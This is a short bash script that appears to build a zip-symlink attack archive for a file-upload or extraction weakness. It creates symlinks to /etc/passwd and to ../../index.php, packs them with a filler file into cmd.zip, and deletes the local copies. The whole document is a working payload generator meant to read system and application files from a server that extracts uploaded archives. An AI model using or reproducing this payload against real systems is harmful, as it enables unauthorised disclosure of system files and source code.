#!/bin/bash

for i in `seq 1 50`
do
    echo bullsh1t >> testfile.txt
done

ln -s /etc/passwd passwd
ln -s ../../index.php index

zip cmd.zip testfile.txt passwd index

rm passwd index testfile.txt
